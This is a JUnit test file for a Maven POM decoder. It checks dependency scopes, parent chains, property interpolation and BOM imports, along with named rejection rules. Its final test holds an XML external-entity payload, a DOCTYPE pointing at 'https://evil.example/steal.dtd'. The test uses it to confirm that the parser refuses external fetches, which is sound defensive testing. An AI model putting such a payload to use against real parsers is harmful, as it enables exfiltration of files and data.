package com.jujin.mj.pom;

import org.junit.jupiter.api.Test;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Contract tests for the Maven wire-format decoder (DESIGN.md §5): every
 * supported pom feature is pinned by a case that fails if decoding drifts,
 * and every subset rejection is pinned by a message that names the rule.
 */
class PomsTest {

    // ------------------------------------------------------------------
    // fixtures
    // ------------------------------------------------------------------

    private static final String POM_NS =
            "xmlns=\"http://maven.apache.org/POM/4.0.0\"";

    private static PomSource source(String... keyAndPom) {
        Map<String, String> poms = new LinkedHashMap<>();
        for (int i = 0; i < keyAndPom.length; i += 2) {
            poms.put(keyAndPom[i], keyAndPom[i + 1]);
        }
        return (groupId, artifactId, version, repositoryBase) -> poms.get(groupId + ":" + artifactId + ":" + version);
    }

    private static PomDependency dep(Pom pom, String artifactId) {
        return pom.dependencies().stream()
                .filter(d -> d.artifactId().equals(artifactId))
                .findFirst()
                .orElseThrow(() -> new AssertionError(
                        "no dependency '" + artifactId + "' in " + pom.dependencies()));
    }

    // ------------------------------------------------------------------
    // the supported grammar
    // ------------------------------------------------------------------

    @Test
    void decodesDirectDependenciesWithNamespaces() {
        Pom pom = Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:lib:1.0.0", """
                <project %s>
                  <modelVersion>4.0.0</modelVersion>
                  <groupId>com.example</groupId>
                  <artifactId>lib</artifactId>
                  <version>1.0.0</version>
                  <packaging>jar</packaging>
                  <dependencies>
                    <dependency>
                      <groupId>org.junit.jupiter</groupId>
                      <artifactId>junit-jupiter</artifactId>
                      <version>6.1.3</version>
                      <scope>test</scope>
                    </dependency>
                    <dependency>
                      <groupId>org.postgresql</groupId>
                      <artifactId>postgresql</artifactId>
                      <version>42.7.4</version>
                    </dependency>
                  </dependencies>
                </project>
                """.formatted(POM_NS)));

        assertEquals("jar", pom.packaging());
        // test scope never propagates to consumers — only postgresql remains
        assertEquals(1, pom.dependencies().size());
        PomDependency postgres = dep(pom, "postgresql");
        assertEquals("compile", postgres.scope());
        assertEquals("42.7.4", postgres.version());
        assertEquals("jar", postgres.type());
    }

    @Test
    void runtimeScopeSurvivesAndProvidedSystemAndOptionalDoNot() {
        Pom pom = Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:lib:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>lib</artifactId>
                  <version>1.0.0</version>
                  <dependencies>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>runtime-api</artifactId>
                      <version>2.0.0</version>
                      <scope>runtime</scope>
                    </dependency>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>provided-dep</artifactId>
                      <version>2.0.0</version>
                      <scope>provided</scope>
                    </dependency>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>optional-dep</artifactId>
                      <version>2.0.0</version>
                      <optional>true</optional>
                    </dependency>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>compile-dep</artifactId>
                      <version>2.0.0</version>
                    </dependency>
                  </dependencies>
                </project>
                """));

        assertEquals(List.of("runtime-api", "compile-dep"),
                pom.dependencies().stream().map(PomDependency::artifactId).toList());
        assertEquals("runtime", dep(pom, "runtime-api").scope());
        assertEquals("compile", dep(pom, "compile-dep").scope());
    }

    @Test
    void decodesExclusionsIncludingWildcards() {
        Pom pom = Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:lib:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>lib</artifactId>
                  <version>1.0.0</version>
                  <dependencies>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>fat</artifactId>
                      <version>2.0.0</version>
                      <exclusions>
                        <exclusion>
                          <groupId>org.example</groupId>
                          <artifactId>heavy</artifactId>
                        </exclusion>
                        <exclusion>
                          <groupId>*</groupId>
                          <artifactId>transitive</artifactId>
                        </exclusion>
                      </exclusions>
                    </dependency>
                  </dependencies>
                </project>
                """));

        PomDependency fat = dep(pom, "fat");
        assertEquals(2, fat.exclusions().size());
        assertEquals(new PomDependency.Exclusion("org.example", "heavy"), fat.exclusions().get(0));
        assertEquals(new PomDependency.Exclusion("*", "transitive"), fat.exclusions().get(1));
    }

    // ------------------------------------------------------------------
    // parent chains and property interpolation
    // ------------------------------------------------------------------

    @Test
    void parentChainInheritsCoordinatesPropertiesAndManagement() {
        // Three levels: the grandparent declares a property, the parent
        // overrides it and manages jackson-databind, the child inherits the
        // groupId and version and resolves its dependency through all of it.
        Pom pom = Poms.decode("com.example", "child", "1.5.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:grand-parent:1.5.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>grand-parent</artifactId>
                  <version>1.5.0</version>
                  <packaging>pom</packaging>
                  <properties>
                    <jackson.version>2.15.2</jackson.version>
                  </properties>
                </project>
                """,
                "com.example:parent:1.5.0", """
                <project>
                  <parent>
                    <groupId>com.example</groupId>
                    <artifactId>grand-parent</artifactId>
                    <version>1.5.0</version>
                  </parent>
                  <artifactId>parent</artifactId>
                  <packaging>pom</packaging>
                  <properties>
                    <jackson.version>2.15.3</jackson.version>
                  </properties>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>com.fasterxml.jackson.core</groupId>
                        <artifactId>jackson-databind</artifactId>
                        <version>${jackson.version}</version>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                </project>
                """,
                "com.example:child:1.5.0", """
                <project>
                  <parent>
                    <groupId>com.example</groupId>
                    <artifactId>parent</artifactId>
                    <version>1.5.0</version>
                  </parent>
                  <artifactId>child</artifactId>
                  <dependencies>
                    <dependency>
                      <groupId>com.fasterxml.jackson.core</groupId>
                      <artifactId>jackson-databind</artifactId>
                    </dependency>
                  </dependencies>
                </project>
                """));

        assertEquals("com.example", pom.groupId(), "groupId inherits from the parent");
        assertEquals("1.5.0", pom.version(), "version inherits from the parent");
        assertEquals("2.15.3", dep(pom, "jackson-databind").version(),
                "the parent's property overrides the grandparent's");
        assertEquals("compile", dep(pom, "jackson-databind").scope(),
                "a managed entry defaults the scope to compile");
    }

    @Test
    void ciFriendlyRevisionVersionInterpolates() {
        Pom pom = Poms.decode("com.example", "lib", "7.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:lib:7.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>lib</artifactId>
                  <version>${revision}</version>
                  <properties>
                    <revision>7.0.0</revision>
                  </properties>
                  <dependencies>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>other</artifactId>
                      <version>${project.version}</version>
                    </dependency>
                  </dependencies>
                </project>
                """));

        assertEquals("7.0.0", pom.version());
        assertEquals("7.0.0", dep(pom, "other").version(), "${project.version} resolves");
    }

    @Test
    void chainedPropertiesResolveToAFixpoint() {
        Pom pom = Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:lib:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>lib</artifactId>
                  <version>1.0.0</version>
                  <properties>
                    <jackson.version>2.15.3</jackson.version>
                    <bom.junit>6.1.3</bom.junit>
                    <group>org.example</group>
                  </properties>
                  <dependencies>
                    <dependency>
                      <groupId>${group}</groupId>
                      <artifactId>other</artifactId>
                      <version>${jackson.version}</version>
                    </dependency>
                  </dependencies>
                </project>
                """));

        assertEquals("org.example", dep(pom, "other").groupId());
        assertEquals("2.15.3", dep(pom, "other").version());
    }

    // ------------------------------------------------------------------
    // dependency management and BOM imports
    // ------------------------------------------------------------------

    @Test
    void ownManagementBeatsBomImportsAndImportsFillGaps() {
        Pom pom = Poms.decode("com.example", "app", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:bom-one:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>bom-one</artifactId>
                  <version>1.0.0</version>
                  <packaging>pom</packaging>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>org.example</groupId>
                        <artifactId>lib-x</artifactId>
                        <version>1.0.0</version>
                      </dependency>
                      <dependency>
                        <groupId>org.example</groupId>
                        <artifactId>lib-b</artifactId>
                        <version>1.0.0</version>
                        <scope>runtime</scope>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                </project>
                """,
                "com.example:bom-two:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>bom-two</artifactId>
                  <version>1.0.0</version>
                  <packaging>pom</packaging>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>org.example</groupId>
                        <artifactId>lib-x</artifactId>
                        <version>9.9.9</version>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                </project>
                """,
                "com.example:app:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>app</artifactId>
                  <version>1.0.0</version>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>org.example</groupId>
                        <artifactId>lib-a</artifactId>
                        <version>3.0.0</version>
                      </dependency>
                      <dependency>
                        <groupId>com.example</groupId>
                        <artifactId>bom-one</artifactId>
                        <version>1.0.0</version>
                        <type>pom</type>
                        <scope>import</scope>
                      </dependency>
                      <dependency>
                        <groupId>com.example</groupId>
                        <artifactId>bom-two</artifactId>
                        <version>1.0.0</version>
                        <type>pom</type>
                        <scope>import</scope>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                  <dependencies>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>lib-a</artifactId>
                    </dependency>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>lib-x</artifactId>
                    </dependency>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>lib-b</artifactId>
                    </dependency>
                  </dependencies>
                </project>
                """));

        assertEquals("3.0.0", dep(pom, "lib-a").version(), "own management beats everything");
        assertEquals("1.0.0", dep(pom, "lib-x").version(),
                "the first import wins over the second");
        assertEquals("runtime", dep(pom, "lib-b").scope(),
                "an import supplies the scope when the dependency declares none");
    }

    @Test
    void managedExclusionsMergeWithDeclaredOnes() {
        Pom pom = Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:lib:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>lib</artifactId>
                  <version>1.0.0</version>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>org.example</groupId>
                        <artifactId>fat</artifactId>
                        <version>2.0.0</version>
                        <exclusions>
                          <exclusion>
                            <groupId>org.managed</groupId>
                            <artifactId>gone</artifactId>
                          </exclusion>
                        </exclusions>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                  <dependencies>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>fat</artifactId>
                      <exclusions>
                        <exclusion>
                          <groupId>org.local</groupId>
                          <artifactId>also-gone</artifactId>
                        </exclusion>
                      </exclusions>
                    </dependency>
                  </dependencies>
                </project>
                """));

        PomDependency fat = dep(pom, "fat");
        assertEquals("2.0.0", fat.version());
        assertEquals(List.of("org.local", "org.managed"),
                fat.exclusions().stream().map(PomDependency.Exclusion::groupId).sorted().toList(),
                "declared and managed exclusions union");
    }

    @Test
    void bundlesDecodeAsJarsAndParentManagementImportsWork() {
        // The spring-boot-starter-parent shape: the parent's dependency
        // management imports a BOM, and the child resolves through it without
        // knowing any of it.
        Pom pom = Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                "com.example:platform:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>platform</artifactId>
                  <version>1.0.0</version>
                  <packaging>pom</packaging>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>com.example</groupId>
                        <artifactId>bom</artifactId>
                        <version>1.0.0</version>
                        <type>pom</type>
                        <scope>import</scope>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                </project>
                """,
                "com.example:bom:1.0.0", """
                <project>
                  <groupId>com.example</groupId>
                  <artifactId>bom</artifactId>
                  <version>1.0.0</version>
                  <packaging>pom</packaging>
                  <dependencyManagement>
                    <dependencies>
                      <dependency>
                        <groupId>org.example</groupId>
                        <artifactId>engine</artifactId>
                        <version>5.0.0</version>
                      </dependency>
                    </dependencies>
                  </dependencyManagement>
                </project>
                """,
                "com.example:lib:1.0.0", """
                <project>
                  <parent>
                    <groupId>com.example</groupId>
                    <artifactId>platform</artifactId>
                    <version>1.0.0</version>
                  </parent>
                  <artifactId>lib</artifactId>
                  <dependencies>
                    <dependency>
                      <groupId>org.example</groupId>
                      <artifactId>engine</artifactId>
                    </dependency>
                    <dependency>
                      <groupId>org.osgi</groupId>
                      <artifactId>core</artifactId>
                      <version>8.0.0</version>
                    </dependency>
                  </dependencies>
                </project>
                """));

        assertEquals("5.0.0", dep(pom, "engine").version(),
                "a BOM imported by the parent manages the child's dependency");
        // an OSGi bundle is a jar
        assertEquals("jar", dep(pom, "core").type());
    }

    // ------------------------------------------------------------------
    // the rejections — named rules, not guesses
    // ------------------------------------------------------------------

    @Test
    void rejectsVersionRanges() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencies>
                            <dependency>
                              <groupId>org.example</groupId>
                              <artifactId>other</artifactId>
                              <version>[1.0,2.0)</version>
                            </dependency>
                          </dependencies>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("version ranges are not supported"),
                "got: " + ex.getMessage());
    }

    @Test
    void rejectsVersionRangesInManagedEntries() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencyManagement>
                            <dependencies>
                              <dependency>
                                <groupId>org.example</groupId>
                                <artifactId>other</artifactId>
                                <version>(,2.0)</version>
                              </dependency>
                            </dependencies>
                          </dependencyManagement>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("version ranges are not supported"),
                "got: " + ex.getMessage());
    }

    @Test
    void rejectsSnapshots() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencies>
                            <dependency>
                              <groupId>org.example</groupId>
                              <artifactId>other</artifactId>
                              <version>2.0.0-SNAPSHOT</version>
                            </dependency>
                          </dependencies>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("snapshots are not supported"),
                "got: " + ex.getMessage());
    }

    @Test
    void rejectsASnapshotRequestedVersion() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0-SNAPSHOT", "https://repo.maven.apache.org/maven2/", source()));
        assertTrue(ex.getMessage().contains("snapshots are not supported"),
                "got: " + ex.getMessage());
    }

    @Test
    void rejectsUnresolvableProperties() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencies>
                            <dependency>
                              <groupId>org.example</groupId>
                              <artifactId>other</artifactId>
                              <version>${never.defined}</version>
                            </dependency>
                          </dependencies>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("unresolvable property"),
                "got: " + ex.getMessage());
    }

    @Test
    void rejectsUnsupportedPackaging() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "webapp", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:webapp:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>webapp</artifactId>
                          <version>1.0.0</version>
                          <packaging>war</packaging>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("unsupported packaging"), "got: " + ex.getMessage());
    }

    @Test
    void rejectsUnsupportedDependencyTypes() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencies>
                            <dependency>
                              <groupId>org.example</groupId>
                              <artifactId>ejb-module</artifactId>
                              <version>1.0.0</version>
                              <type>ejb</type>
                            </dependency>
                          </dependencies>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("unsupported type"), "got: " + ex.getMessage());
    }

    @Test
    void rejectsADependencyWithoutVersionOrManagement() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencies>
                            <dependency>
                              <groupId>org.example</groupId>
                              <artifactId>orphan</artifactId>
                            </dependency>
                          </dependencies>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("has no version and none is managed"),
                "got: " + ex.getMessage());
    }

    @Test
    void rejectsAPomThatDisagreesWithItsCoordinate() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>9.9.9</version>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("declares version '9.9.9'"), "got: " + ex.getMessage());
    }

    @Test
    void rejectsCircularParentChains() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "a", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:a:1.0.0", """
                        <project>
                          <parent>
                            <groupId>com.example</groupId>
                            <artifactId>b</artifactId>
                            <version>1.0.0</version>
                          </parent>
                          <artifactId>a</artifactId>
                        </project>
                        """,
                        "com.example:b:1.0.0", """
                        <project>
                          <parent>
                            <groupId>com.example</groupId>
                            <artifactId>a</artifactId>
                            <version>1.0.0</version>
                          </parent>
                          <artifactId>b</artifactId>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("circular parent chain"), "got: " + ex.getMessage());
    }

    @Test
    void unknownScopesAreRejectedNotGuessed() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("com.example", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "com.example:lib:1.0.0", """
                        <project>
                          <groupId>com.example</groupId>
                          <artifactId>lib</artifactId>
                          <version>1.0.0</version>
                          <dependencies>
                            <dependency>
                              <groupId>org.example</groupId>
                              <artifactId>other</artifactId>
                              <version>1.0.0</version>
                              <scope>compileplus</scope>
                            </dependency>
                          </dependencies>
                        </project>
                        """)));
        assertTrue(ex.getMessage().contains("unknown scope"), "got: " + ex.getMessage());
    }

    @Test
    void aMissingPomNamesTheArtifact() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("org.missing", "lib", "1.0.0", "https://repo.maven.apache.org/maven2/", source()));
        assertTrue(ex.getMessage().contains("org.missing:lib:1.0.0"), "got: " + ex.getMessage());
    }

    @Test
    void malformedXmlFailsWithTheArtifactNamed() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("org.example", "broken", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "org.example:broken:1.0.0", "<project><groupId>")));
        assertTrue(ex.getMessage().contains("org.example:broken:1.0.0"), "got: " + ex.getMessage());
    }

    @Test
    void aPlantedDtdFailsInsteadOfFetching() {
        PomException ex = assertThrows(PomException.class, () ->
                Poms.decode("org.example", "evil", "1.0.0", "https://repo.maven.apache.org/maven2/", source(
                        "org.example:evil:1.0.0", """
                        <!DOCTYPE project SYSTEM "https://evil.example/steal.dtd">
                        <project>
                          <groupId>org.example</groupId>
                          <artifactId>evil</artifactId>
                          <version>1.0.0</version>
                        </project>
                        """)));
        // The failure is the security posture, not a specific message — what
        // matters is that nothing external is fetched and the artifact is named.
        assertTrue(ex.getMessage().contains("org.example:evil:1.0.0"), "got: " + ex.getMessage());
    }
}
